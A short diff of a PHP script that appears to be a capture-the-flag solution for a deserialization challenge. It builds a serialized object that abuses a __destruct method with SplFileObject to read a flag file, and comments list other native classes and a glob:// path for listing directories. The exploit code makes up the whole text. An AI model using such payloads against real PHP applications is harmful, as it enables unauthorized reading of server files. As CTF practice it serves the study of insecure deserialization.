@@ -12,7 +12,6 @@ class A
     public function __destruct()
     {
         echo new $this->a($this->b);    
-        // echo new Exception(system("dir"));
     }
 }
 
@@ -22,12 +21,7 @@ $exp=new A();
 // $exp->b='/*f*';   // glob:///*   fl1aaaaaaa9
 
 $exp->a='SplFileObject'; //DirectoryIterator FilesystemIterator SplFileObject  GlobIterator ReflectionClass ReflectionMethod
-// $exp->b='/bin/znew';   // glob:///*
 $exp->b='/fl1aaaaaaa9';   // glob:///*   fl1aaaaaaa9
-echo new $exp->a($exp->b);
-echo "<br>";
+// echo new $exp->a($exp->b);
 echo(serialize($exp));
-// echo dirname(__FILE__);
-// throw new Exception('can can need new new');
-// new SplFileObject("./flag.txt");
 
